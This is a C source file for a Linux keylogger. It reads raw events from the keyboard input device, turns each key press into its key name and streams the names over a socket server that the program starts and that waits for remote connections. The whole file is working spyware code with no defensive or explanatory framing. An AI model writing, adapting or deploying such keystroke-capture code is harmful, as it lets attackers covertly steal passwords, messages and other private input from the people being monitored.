#include "socket_server.h"
#include "logger.h"
#include "key_names.h"

void keylogger ()
{
    int keyboard = 0;
    int count = 0;
    int event_size = sizeof(struct input_event);
    int bytes_read = 0;
    struct input_event event[64];
    struct parse_key *key = NULL;
    
    // Open the keyboard input device for listening
    keyboard = open(KEYBOARD_DEVICE, O_RDONLY);
    if (keyboard == -1)
    {
        fprintf(stderr, "Unable to open keyboard");
        exit(EXIT_FAILURE);
    }

    // Start logging the keys
    while (1)
    {
        // Read a keypress
        bytes_read = read(keyboard, event, event_size * 64);
        // Loop through the generated events
        for (count = 0; count < (bytes_read / event_size); count++)
        {
            if (EV_KEY == event[count].type)
            {
                if ((event[count].value == KEY_PRESS) || (event[count].value == KEY_HELD))
                {
                    // Find the correct name of the keypress. This is O(n) :-(
                    for (key = key_names; key->name != NULL; key++)
                    {
                        if (key->value == (unsigned) event[count].code)
                        {
                            fprintf(stderr, "%s", key->name);
                            write_socket(key->name);
                        }
                    }
                }
            }
        }
    }
}

int main (int argc, char* argv[])
{
    fprintf(stderr, "Waiting for connections...");
    start_socket_server(SOCKET_SERVER_PORT);
    fprintf(stderr, " nice.\n");
    keylogger();

    return 0;
}


